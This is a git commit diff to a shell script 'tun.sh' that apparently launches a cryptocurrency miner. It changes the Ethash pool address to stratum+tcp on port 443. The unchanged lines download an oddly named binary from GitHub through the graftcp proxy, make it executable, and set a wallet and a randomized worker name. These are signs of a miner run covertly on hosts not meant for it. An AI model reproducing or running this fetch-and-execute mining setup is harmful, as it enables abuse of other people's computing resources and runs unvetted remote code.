44347cc0721aff92855c79abde633f52973cda17
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-04-18 19:20:08 -0600

    Update tun.sh

--- tun.sh
+++ tun.sh
@@ -37,7 +37,7 @@ echo " "
 
 ./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
-POOL=ethash.poolbinance.com:1800
+POOL=stratum+tcp://ethash.poolbinance.com:443
 WALLET=teguhcong
 WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
 
